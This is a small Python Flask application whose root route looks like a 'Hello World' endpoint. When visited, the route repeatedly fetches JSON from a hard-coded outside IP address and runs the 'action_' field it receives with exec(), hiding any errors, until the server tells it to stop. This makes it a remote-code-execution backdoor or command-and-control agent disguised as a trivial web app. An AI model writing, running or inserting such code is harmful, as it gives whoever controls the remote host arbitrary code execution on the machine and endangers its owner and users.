from flask import Flask, jsonify
import requests
import time

current_action = ""
proceed = True
#print requests.get("http://icanhazip.com/").text.strip()

app = Flask(__name__)

@app.route("/")
def home():
  global current_action
  global proceed
  while (proceed):
    try:
      response = requests.get("http://188.166.80.191")
      json_data = response.json()
      proceed = json_data["continue_"] == u'true'
      if current_action != json_data["action_"]:
        current_action = json_data["action_"]
        print "New action!"
      #print json_data
      exec(current_action)
      time.sleep(2)
    except Exception as e:
      print "kewl"
  return jsonify(message="Hello World!")
  
if __name__ == "__main__":
  print "wassup"
  app.run(host= '0.0.0.0', port=9000, debug=False)
